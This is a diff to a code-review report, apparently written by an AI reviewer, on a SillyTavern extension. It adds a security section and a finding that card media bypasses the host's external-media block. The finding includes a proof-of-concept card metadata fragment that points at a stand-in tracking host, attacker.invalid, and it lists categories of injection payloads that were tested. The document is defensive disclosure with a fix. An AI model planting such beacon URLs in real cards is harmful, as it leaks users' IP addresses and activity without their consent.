@@ -32,6 +32,7 @@ P1 means high priority because subsequent user data can be lost. P2 means a func
 | 6 | P3 | Bug, isolated reproduction | Uploaded book and agent pictures bypass cleanup |
 | 7 | P3 | Bug, workflow reproduction | CI omits three module versions from its consistency check |
 | 8 | P2 | Verify, source evidence | Map marker styles also match Pinned Blocks |
+| 9 | P2 | Security/privacy, isolated reproduction | Card media bypasses SillyTavern's external-media block |
 
 ### 1. ChatGPT review: Bug: Failed data removal leaves card saving disabled
 
@@ -128,3 +129,49 @@ P1 means high priority because subsequent user data can be lost. P2 means a func
 **Suggested check:** Put a populated floating Pinned Block at a known position with frame None. Compare its position, background, border, and text size before opening Maps, while Maps is open, and after closing it. Also check desktop and phone layouts.
 
 **Suggested fix if confirmed:** Scope marker selectors under `#ntr_map` or give map markers a distinct class, including label and state selectors.
+
+## Additional security review
+
+The follow-up review examined card and theme inputs, HTML rendering, CSS generation and import, media URL validation, uploaded-file handling, file cleanup and export, agent requests and saved key IDs, YouTube messages, Phone Preview, and development tooling. It found the privacy-policy bypass below. It did **not** establish a route to account takeover, arbitrary script execution, or API-key theft. That is a scoped review result, not a guarantee that the extension or its host is secure.
+
+Additional isolated checks and source evidence:
+
+- Seven sample URL payloads were rejected by the actual `cUrl`: JavaScript URLs, HTML and SVG data URLs, protocol-relative URLs, plain and percent-encoded parent-directory traversal, and attribute-breaking quotes. Supported external HTTP(S) URLs are still accepted; that acceptance is relevant to finding 9.
+- HTML containing an image error handler was escaped by the core helper, VN dialogue formatter, and agent activity renderer. No executable image element remained in their returned HTML.
+- Malicious tag and class strings were removed by `cleanPins`. Invalid font and color strings were omitted from theme sections. A sample JSON `__proto__` property did not pollute the VM's object prototype through `cleanLookSection`. These are sample checks, not proof against every injection payload.
+- Exercising the actual theme-import callbacks with all three Custom CSS switches set to true still stored `rbCssOn`, `rbBtnCssOn`, and `ovScrollCssOn` as false. Imported CSS requires a later explicit enable action.
+- SillyTavern's inspected host source sets `toastr.options.escapeHtml = true`; unescaped strings passed to those toast calls were therefore not reported as confirmed HTML injection. The extension's key picker retains saved key IDs and labels, and its normal theme sections exclude agent connection settings. No untrusted-card or theme path redirecting a saved API key was established.
+- Pinned Blocks clone the host-rendered message DOM. The inspected host formatter sanitizes messages with DOMPurify before that DOM exists. The clone alone is not evidence of a sanitizer bypass. YouTube callbacks check the sending frame, and the embed destination is constructed under YouTube's origin.
+
+Host behavior was cross-checked against SillyTavern `release` at [`06bde939fb1e9c4c8d8641d810f0a916b5bce127`](https://github.com/SillyTavern/SillyTavern/commit/06bde939fb1e9c4c8d8641d810f0a916b5bce127), including [external-media policy](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L853), [media sanitization](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/scripts/chats.js#L1974), and [toast escaping](https://github.com/SillyTavern/SillyTavern/blob/06bde939fb1e9c4c8d8641d810f0a916b5bce127/public/script.js#L360). The user's installed host version and other extensions were not available for integration testing. No real secrets, hostile servers, or user data were used in the checks.
+
+### 9. ChatGPT review: Bug: Card media bypasses SillyTavern's external-media block
+
+**Location:** [foreground rendering:699](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L699), [media helper:4454](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L4454), and [banner image assignment:1700](https://github.com/SepsisShock/NTR-Extension/blob/a965f5454acf7f1e07a985dd3b17ff547d24b99a/index.js#L1700). Similar direct assignments exist for VN art, maps, opening media, and menu thumbnails.
+
+**Attack conditions:** A card author controls a supported external image or media URL in the card's NTR metadata. The victim opens the card with the relevant feature enabled, or with foreground elements left mounted from earlier use. The victim has blocked external media globally or for that character in SillyTavern.
+
+**Impact:** NTR cleans the URL's syntax, then `media` returns the string unchanged and rendering assigns it directly to `src` or a CSS background. It never consults the host's external-media permission. A URL unique to the card or recipient can therefore contact the author's server despite the block, disclosing the user's public IP address and the time the card was viewed. This is unwanted external contact and tracking. It is not, by itself, proof of access to chat contents, host cookies, API keys, or the user's machine.
+
+**Evidence:** With `powerUserSettings.forbid_external_media = true`, an imported card containing `ntr.fg.Left = "https://attacker.invalid/beacon/card-123.png"` was passed through the actual card cleaner and foreground renderer. The mock image element received that exact external `src`. An available false-returning policy stub was never consulted. The assignment occurred with Foreground enabled and again with Foreground disabled when its elements already existed: setting their display to `none` does not prevent a browser from fetching a newly assigned image source. The mock recorded assignment only; it made no external request.
+
+A minimal metadata fragment for a disposable test card is:
+
+```json
+{
+  "data": {
+    "extensions": {
+      "ntr": {
+        "v": 1,
+        "fg": {
+          "Left": "https://attacker.invalid/beacon/card-123.png"
+        }
+      }
+    }
+  }
+}
+```
+
+**Suggested fix:** Centralize permission-aware media resolution using SillyTavern's external-media policy, including character overrides, and apply it before all card-supplied `src`, thumbnail, video, embed, and background assignments. Retain local and supported embedded images. Stop assigning or retaining external sources in inactive foreground elements, and clear prohibited sources when the host policy changes. Explicit user approval of an external URL should follow a clearly defined policy rather than silently bypassing the block.
+
+**Host check:** Use a disposable card and a controlled test image server. Block external media globally and through a character override, then open the card with foreground, banners, VN, and menu previews in turn. Record browser network requests. Repeat after turning Foreground off following earlier use. Require zero prohibited external requests while allowing local images and explicitly permitted media.
